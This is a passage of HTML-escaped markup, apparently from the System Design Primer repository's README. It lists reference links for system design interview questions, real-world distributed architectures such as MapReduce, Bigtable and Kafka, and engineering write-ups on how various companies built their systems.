href=&#34;https://gist.github.com/jboner/2841832&#34;&gt;Latency numbers every programmer should know - 1&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://gist.github.com/hellerbarde/2843375&#34;&gt;Latency numbers every programmer should know - 2&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;http://www.cs.cornell.edu/projects/ladis2009/talks/dean-keynote-ladis2009.pdf&#34;&gt;Designs, lessons, and advice from building large distributed systems&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://static.googleusercontent.com/media/research.google.com/en//people/jeff/stanford-295-talk.pdf&#34;&gt;Software Engineering Advice from Building Large-Scale Distributed Systems&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Additional system design interview questions&lt;/h3&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;Common system design interview questions, with links to resources on how to solve each.&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;table&gt; &#xA; &lt;thead&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;th&gt;Question&lt;/th&gt; &#xA;   &lt;th&gt;Reference(s)&lt;/th&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/thead&gt; &#xA; &lt;tbody&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Design a file sync service like Dropbox&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://www.youtube.com/watch?v=PE4gwstWhmc&#34;&gt;youtube.com&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Design a search engine like Google&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;http://queue.acm.org/detail.cfm?id=988407&#34;&gt;queue.acm.org&lt;/a&gt;&lt;br&gt;&lt;a href=&#34;http://programmers.stackexchange.com/questions/38324/interview-question-how-would-you-implement-google-search&#34;&gt;stackexchange.com&lt;/a&gt;&lt;br&gt;&lt;a href=&#34;http://www.ardendertat.com/2012/01/11/implementing-search-engines/&#34;&gt;ardendertat.com&lt;/a&gt;&lt;br&gt;&lt;a href=&#34;http://infolab.stanford.edu/~backrub/google.html&#34;&gt;stanford.edu&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Design a scalable web crawler like Google&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://www.quora.com/How-can-I-build-a-web-crawler-from-scratch&#34;&gt;quora.com&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Design Google docs&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://code.google.com/p/google-mobwrite/&#34;&gt;code.google.com&lt;/a&gt;&lt;br&gt;&lt;a href=&#34;https://neil.fraser.name/writing/sync/&#34;&gt;neil.fraser.name&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Design a key-value store like Redis&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;http://www.slideshare.net/dvirsky/introduction-to-redis&#34;&gt;slideshare.net&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Design a cache system like Memcached&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;http://www.slideshare.net/oemebamo/introduction-to-memcached&#34;&gt;slideshare.net&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Design a recommendation system like Amazon&#39;s&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://web.archive.org/web/20170406065247/http://tech.hulu.com/blog/2011/09/19/recommendation-system.html&#34;&gt;hulu.com&lt;/a&gt;&lt;br&gt;&lt;a href=&#34;http://ijcai13.org/files/tutorial_slides/td3.pdf&#34;&gt;ijcai13.org&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Design a tinyurl system like Bitly&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;http://n00tc0d3r.blogspot.com/&#34;&gt;n00tc0d3r.blogspot.com&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Design a chat app like WhatsApp&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;http://highscalability.com/blog/2014/2/26/the-whatsapp-architecture-facebook-bought-for-19-billion.html&#34;&gt;highscalability.com&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Design a picture sharing system like Instagram&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;http://highscalability.com/flickr-architecture&#34;&gt;highscalability.com&lt;/a&gt;&lt;br&gt;&lt;a href=&#34;http://highscalability.com/blog/2011/12/6/instagram-architecture-14-million-users-terabytes-of-photos.html&#34;&gt;highscalability.com&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Design the Facebook news feed function&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;http://www.quora.com/What-are-best-practices-for-building-something-like-a-News-Feed&#34;&gt;quora.com&lt;/a&gt;&lt;br&gt;&lt;a href=&#34;http://www.quora.com/Activity-Streams/What-are-the-scaling-issues-to-keep-in-mind-while-developing-a-social-network-feed&#34;&gt;quora.com&lt;/a&gt;&lt;br&gt;&lt;a href=&#34;http://www.slideshare.net/danmckinley/etsy-activity-feeds-architecture&#34;&gt;slideshare.net&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Design the Facebook timeline function&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://www.facebook.com/note.php?note_id=10150468255628920&#34;&gt;facebook.com&lt;/a&gt;&lt;br&gt;&lt;a href=&#34;http://highscalability.com/blog/2012/1/23/facebook-timeline-brought-to-you-by-the-power-of-denormaliza.html&#34;&gt;highscalability.com&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Design the Facebook chat function&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;http://www.erlang-factory.com/upload/presentations/31/EugeneLetuchy-ErlangatFacebook.pdf&#34;&gt;erlang-factory.com&lt;/a&gt;&lt;br&gt;&lt;a href=&#34;https://www.facebook.com/note.php?note_id=14218138919&amp;amp;id=9445547199&amp;amp;index=0&#34;&gt;facebook.com&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Design a graph search function like Facebook&#39;s&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://www.facebook.com/notes/facebook-engineering/under-the-hood-building-out-the-infrastructure-for-graph-search/10151347573598920&#34;&gt;facebook.com&lt;/a&gt;&lt;br&gt;&lt;a href=&#34;https://www.facebook.com/notes/facebook-engineering/under-the-hood-indexing-and-ranking-in-graph-search/10151361720763920&#34;&gt;facebook.com&lt;/a&gt;&lt;br&gt;&lt;a href=&#34;https://www.facebook.com/notes/facebook-engineering/under-the-hood-the-natural-language-interface-of-graph-search/10151432733048920&#34;&gt;facebook.com&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Design a content delivery network like CloudFlare&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://figshare.com/articles/Globally_distributed_content_delivery/6605972&#34;&gt;figshare.com&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Design a trending topic system like Twitter&#39;s&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;http://www.michael-noll.com/blog/2013/01/18/implementing-real-time-trending-topics-in-storm/&#34;&gt;michael-noll.com&lt;/a&gt;&lt;br&gt;&lt;a href=&#34;http://snikolov.wordpress.com/2012/11/14/early-detection-of-twitter-trends/&#34;&gt;snikolov .wordpress.com&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Design a random ID generation system&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://blog.twitter.com/2010/announcing-snowflake&#34;&gt;blog.twitter.com&lt;/a&gt;&lt;br&gt;&lt;a href=&#34;https://github.com/twitter/snowflake/&#34;&gt;github.com&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Return the top k requests during a time interval&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://www.cs.ucsb.edu/sites/cs.ucsb.edu/files/docs/reports/2005-23.pdf&#34;&gt;cs.ucsb.edu&lt;/a&gt;&lt;br&gt;&lt;a href=&#34;http://davis.wpi.edu/xmdv/docs/EDBT11-diyang.pdf&#34;&gt;wpi.edu&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Design a system that serves data from multiple data centers&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;http://highscalability.com/blog/2009/8/24/how-google-serves-data-from-multiple-datacenters.html&#34;&gt;highscalability.com&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Design an online multiplayer card game&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://web.archive.org/web/20180929181117/http://www.indieflashblog.com/how-to-create-an-asynchronous-multiplayer-game.html&#34;&gt;indieflashblog.com&lt;/a&gt;&lt;br&gt;&lt;a href=&#34;http://buildnewgames.com/real-time-multiplayer/&#34;&gt;buildnewgames.com&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Design a garbage collection system&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;http://journal.stuffwithstuff.com/2013/12/08/babys-first-garbage-collector/&#34;&gt;stuffwithstuff.com&lt;/a&gt;&lt;br&gt;&lt;a href=&#34;http://courses.cs.washington.edu/courses/csep521/07wi/prj/rick.pdf&#34;&gt;washington.edu&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Design an API rate limiter&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://stripe.com/blog/rate-limiters&#34;&gt;https://stripe.com/blog/&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Design a Stock Exchange (like NASDAQ or Binance)&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://youtu.be/b1e4t2k2KJY&#34;&gt;Jane Street&lt;/a&gt;&lt;br&gt;&lt;a href=&#34;https://around25.com/blog/building-a-trading-engine-for-a-crypto-exchange/&#34;&gt;Golang Implementation&lt;/a&gt;&lt;br&gt;&lt;a href=&#34;http://bhomnick.net/building-a-simple-limit-order-in-go/&#34;&gt;Go Implementation&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Add a system design question&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/#contributing&#34;&gt;Contribute&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/tbody&gt; &#xA;&lt;/table&gt; &#xA;&lt;h3&gt;Real world architectures&lt;/h3&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;Articles on how real world systems are designed.&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;p align=&#34;center&#34;&gt; &lt;img src=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/images/TcUo2fw.png&#34;&gt; &lt;br&gt; &lt;i&gt;&lt;a href=&#34;https://www.infoq.com/presentations/Twitter-Timeline-Scalability&#34;&gt;Source: Twitter timelines at scale&lt;/a&gt;&lt;/i&gt; &lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Don&#39;t focus on nitty gritty details for the following articles, instead:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Identify shared principles, common technologies, and patterns within these articles&lt;/li&gt; &#xA; &lt;li&gt;Study what problems are solved by each component, where it works, where it doesn&#39;t&lt;/li&gt; &#xA; &lt;li&gt;Review the lessons learned&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;table&gt; &#xA; &lt;thead&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;th&gt;Type&lt;/th&gt; &#xA;   &lt;th&gt;System&lt;/th&gt; &#xA;   &lt;th&gt;Reference(s)&lt;/th&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/thead&gt; &#xA; &lt;tbody&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Data processing&lt;/td&gt; &#xA;   &lt;td&gt;&lt;strong&gt;MapReduce&lt;/strong&gt; - Distributed data processing from Google&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;http://static.googleusercontent.com/media/research.google.com/zh-CN/us/archive/mapreduce-osdi04.pdf&#34;&gt;research.google.com&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Data processing&lt;/td&gt; &#xA;   &lt;td&gt;&lt;strong&gt;Spark&lt;/strong&gt; - Distributed data processing from Databricks&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;http://www.slideshare.net/AGrishchenko/apache-spark-architecture&#34;&gt;slideshare.net&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Data processing&lt;/td&gt; &#xA;   &lt;td&gt;&lt;strong&gt;Storm&lt;/strong&gt; - Distributed data processing from Twitter&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;http://www.slideshare.net/previa/storm-16094009&#34;&gt;slideshare.net&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Data store&lt;/td&gt; &#xA;   &lt;td&gt;&lt;strong&gt;Bigtable&lt;/strong&gt; - Distributed column-oriented database from Google&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;http://www.read.seas.harvard.edu/~kohler/class/cs239-w08/chang06bigtable.pdf&#34;&gt;harvard.edu&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Data store&lt;/td&gt; &#xA;   &lt;td&gt;&lt;strong&gt;HBase&lt;/strong&gt; - Open source implementation of Bigtable&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;http://www.slideshare.net/alexbaranau/intro-to-hbase&#34;&gt;slideshare.net&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Data store&lt;/td&gt; &#xA;   &lt;td&gt;&lt;strong&gt;Cassandra&lt;/strong&gt; - Distributed column-oriented database from Facebook&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;http://www.slideshare.net/planetcassandra/cassandra-introduction-features-30103666&#34;&gt;slideshare.net&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Data store&lt;/td&gt; &#xA;   &lt;td&gt;&lt;strong&gt;DynamoDB&lt;/strong&gt; - Document-oriented database from Amazon&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;http://www.read.seas.harvard.edu/~kohler/class/cs239-w08/decandia07dynamo.pdf&#34;&gt;harvard.edu&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Data store&lt;/td&gt; &#xA;   &lt;td&gt;&lt;strong&gt;MongoDB&lt;/strong&gt; - Document-oriented database&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;http://www.slideshare.net/mdirolf/introduction-to-mongodb&#34;&gt;slideshare.net&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Data store&lt;/td&gt; &#xA;   &lt;td&gt;&lt;strong&gt;Spanner&lt;/strong&gt; - Globally-distributed database from Google&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;http://research.google.com/archive/spanner-osdi2012.pdf&#34;&gt;research.google.com&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Data store&lt;/td&gt; &#xA;   &lt;td&gt;&lt;strong&gt;Memcached&lt;/strong&gt; - Distributed memory caching system&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;http://www.slideshare.net/oemebamo/introduction-to-memcached&#34;&gt;slideshare.net&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Data store&lt;/td&gt; &#xA;   &lt;td&gt;&lt;strong&gt;Redis&lt;/strong&gt; - Distributed memory caching system with persistence and value types&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;http://www.slideshare.net/dvirsky/introduction-to-redis&#34;&gt;slideshare.net&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;File system&lt;/td&gt; &#xA;   &lt;td&gt;&lt;strong&gt;Google File System (GFS)&lt;/strong&gt; - Distributed file system&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;http://static.googleusercontent.com/media/research.google.com/zh-CN/us/archive/gfs-sosp2003.pdf&#34;&gt;research.google.com&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;File system&lt;/td&gt; &#xA;   &lt;td&gt;&lt;strong&gt;Hadoop File System (HDFS)&lt;/strong&gt; - Open source implementation of GFS&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;http://hadoop.apache.org/docs/stable/hadoop-project-dist/hadoop-hdfs/HdfsDesign.html&#34;&gt;apache.org&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Misc&lt;/td&gt; &#xA;   &lt;td&gt;&lt;strong&gt;Chubby&lt;/strong&gt; - Lock service for loosely-coupled distributed systems from Google&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;http://static.googleusercontent.com/external_content/untrusted_dlcp/research.google.com/en/us/archive/chubby-osdi06.pdf&#34;&gt;research.google.com&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Misc&lt;/td&gt; &#xA;   &lt;td&gt;&lt;strong&gt;Dapper&lt;/strong&gt; - Distributed systems tracing infrastructure&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;http://static.googleusercontent.com/media/research.google.com/en//pubs/archive/36356.pdf&#34;&gt;research.google.com&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Misc&lt;/td&gt; &#xA;   &lt;td&gt;&lt;strong&gt;Kafka&lt;/strong&gt; - Pub/sub message queue from LinkedIn&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;http://www.slideshare.net/mumrah/kafka-talk-tri-hug&#34;&gt;slideshare.net&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Misc&lt;/td&gt; &#xA;   &lt;td&gt;&lt;strong&gt;Zookeeper&lt;/strong&gt; - Centralized infrastructure and services enabling synchronization&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;http://www.slideshare.net/sauravhaloi/introduction-to-apache-zookeeper&#34;&gt;slideshare.net&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;/td&gt; &#xA;   &lt;td&gt;Add an architecture&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/#contributing&#34;&gt;Contribute&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/tbody&gt; &#xA;&lt;/table&gt; &#xA;&lt;h3&gt;Company architectures&lt;/h3&gt; &#xA;&lt;table&gt; &#xA; &lt;thead&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;th&gt;Company&lt;/th&gt; &#xA;   &lt;th&gt;Reference(s)&lt;/th&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/thead&gt; &#xA; &lt;tbody&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Amazon&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;http://highscalability.com/amazon-architecture&#34;&gt;Amazon architecture&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Cinchcast&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;http://highscalability.com/blog/2012/7/16/cinchcast-architecture-producing-1500-hours-of-audio-every-d.html&#34;&gt;Producing 1,500 hours of audio every day&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;DataSift&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;http://highscalability.com/blog/2011/11/29/datasift-architecture-realtime-datamining-at-120000-tweets-p.html&#34;&gt;Realtime datamining At 120,000 tweets per second&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Dropbox&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://www.youtube.com/watch?v=PE4gwstWhmc&#34;&gt;How we&#39;ve scaled Dropbox&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;ESPN&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;http://highscalability.com/blog/2013/11/4/espns-architecture-at-scale-operating-at-100000-duh-nuh-nuhs.html&#34;&gt;Operating At 100,000 duh nuh nuhs per second&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Google&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;http://highscalability.com/google-architecture&#34;&gt;Google architecture&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Instagram&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;http://highscalability.com/blog/2011/12/6/instagram-architecture-14-million-users-terabytes-of-photos.html&#34;&gt;14 million users, terabytes of photos&lt;/a&gt;&lt;br&gt;&lt;a href=&#34;http://instagram-engineering.tumblr.com/post/13649370142/what-powers-instagram-hundreds-of-instances&#34;&gt;What powers Instagram&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Justin.tv&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;http://highscalability.com/blog/2010/3/16/justintvs-live-video-broadcasting-architecture.html&#34;&gt;Justin.Tv&#39;s live video broadcasting architecture&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Facebook&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://cs.uwaterloo.ca/~brecht/courses/854-Emerging-2014/readings/key-value/fb-memcached-nsdi-2013.pdf&#34;&gt;Scaling memcached at Facebook&lt;/a&gt;&lt;br&gt;&lt;a href=&#34;https://cs.uwaterloo.ca/~brecht/courses/854-Emerging-2014/readings/data-store/tao-facebook-distributed-datastore-atc-2013.pdf&#34;&gt;TAO: Facebook’s distributed data store for the social graph&lt;/a&gt;&lt;br&gt;&lt;a href=&#34;https://www.usenix.org/legacy/event/osdi10/tech/full_papers/Beaver.pdf&#34;&gt;Facebook’s photo storage&lt;/a&gt;&lt;br&gt;&lt;a href=&#34;http://highscalability.com/blog/2016/6/27/how-facebook-live-streams-to-800000-simultaneous-viewers.html&#34;&gt;How Facebook Live Streams To 800,000 Simultaneous Viewers&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Flickr&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;http://highscalability.com/flickr-architecture&#34;&gt;Flickr architecture&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Mailbox&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;http://highscalability.com/blog/2013/6/18/scaling-mailbox-from-0-to-one-million-users-in-6-weeks-and-1.html&#34;&gt;From 0 to one million users in 6 weeks&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Netflix&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;http://highscalability.com/blog/2015/11/9/a-360-degree-view-of-the-entire-netflix-stack.html&#34;&gt;A 360 Degree View Of The Entire Netflix Stack&lt;/a&gt;&lt;br&gt;&lt;a href=&#34;http://highscalability.com/blog/2017/12/11/netflix-what-happens-when-you-press-play.html&#34;&gt;Netflix: What Happens When You Press Play?&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Pinterest&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;http://highscalability.com/blog/2013/4/15/scaling-pinterest-from-0-to-10s-of-billions-of-page-views-a.html&#34;&gt;From 0 To 10s of billions of page views a month&lt;/a&gt;&lt;br&gt;&lt;a href=&#34;http://highscalability.com/blog/2012/5/21/pinterest-architecture-update-18-million-visitors-10x-growth.html&#34;&gt;18 million visitors, 10x growth, 12 employees&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Playfish&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;http://highscalability.com/blog/2010/9/21/playfishs-social-gaming-architecture-50-million-monthly-user.html&#34;&gt;50 million monthly users and growing&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;PlentyOfFish&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;http://highscalability.com/plentyoffish-architecture&#34;&gt;PlentyOfFish architecture&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Salesforce&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;http://highscalability.com/blog/2013/9/23/salesforce-architecture-how-they-handle-13-billion-transacti.html&#34;&gt;How they handle 1.3 billion transactions a day&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Stack Overflow&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;http://highscalability.com/blog/2009/8/5/stack-overflow-architecture.html&#34;&gt;Stack Overflow architecture&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;TripAdvisor&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;http://highscalability.com/blog/2011/6/27/tripadvisor-architecture-40m-visitors-200m-dynamic-page-view.html&#34;&gt;40M visitors, 200M dynamic page views, 30TB data&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Tumblr&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a 